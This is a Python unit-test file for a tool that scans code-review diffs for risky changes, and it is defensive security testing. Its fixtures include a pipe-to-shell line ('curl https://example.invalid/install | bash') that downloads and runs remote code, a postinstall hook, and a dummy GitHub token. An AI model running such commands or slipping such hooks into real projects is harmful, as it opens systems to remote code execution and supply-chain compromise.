import unittest

from reviewrisk.core import scan_diff, should_fail


class ScanDiffTests(unittest.TestCase):
    def test_flags_workflow_write_permission(self):
        diff = """diff --git a/.github/workflows/release.yml b/.github/workflows/release.yml
--- a/.github/workflows/release.yml
+++ b/.github/workflows/release.yml
@@ -1,2 +1,4 @@
 permissions:
+  contents: write
"""
        result = scan_diff(diff)
        rules = {f.rule for f in result.findings}
        self.assertIn("sensitive-path", rules)
        self.assertIn("workflow-write-permission", rules)
        self.assertTrue(should_fail(result, "high"))

    def test_flags_pipe_to_shell(self):
        diff = """diff --git a/install.sh b/install.sh
--- a/install.sh
+++ b/install.sh
@@ -1 +1 @@
-echo safe
+curl https://example.invalid/install | bash
"""
        result = scan_diff(diff)
        self.assertIn("pipe-to-shell", {f.rule for f in result.findings})

    def test_flags_package_lifecycle_script(self):
        diff = """diff --git a/package.json b/package.json
--- a/package.json
+++ b/package.json
@@ -2,3 +2,4 @@
   \"scripts\": {
+    \"postinstall\": \"node setup.js\"
   }
"""
        result = scan_diff(diff)
        self.assertIn("package-lifecycle-script", {f.rule for f in result.findings})

    def test_redacts_token_evidence(self):
        diff = """diff --git a/config.txt b/config.txt
--- /dev/null
+++ b/config.txt
@@ -0,0 +1 @@
+token=ghp_abcdefghijklmnopqrstuvwxyz123456
"""
        result = scan_diff(diff)
        finding = next(f for f in result.findings if f.rule == "github-token")
        self.assertNotIn("ghp_abcdefghijklmnopqrstuvwxyz123456", finding.evidence)
        self.assertEqual(finding.severity, "critical")

    def test_clean_diff(self):
        diff = """diff --git a/docs/guide.md b/docs/guide.md
--- a/docs/guide.md
+++ b/docs/guide.md
@@ -1 +1,2 @@
 # Guide
+More documentation.
"""
        result = scan_diff(diff)
        self.assertEqual(result.findings, [])
        self.assertEqual(result.files_changed, 1)


if __name__ == "__main__":
    unittest.main()
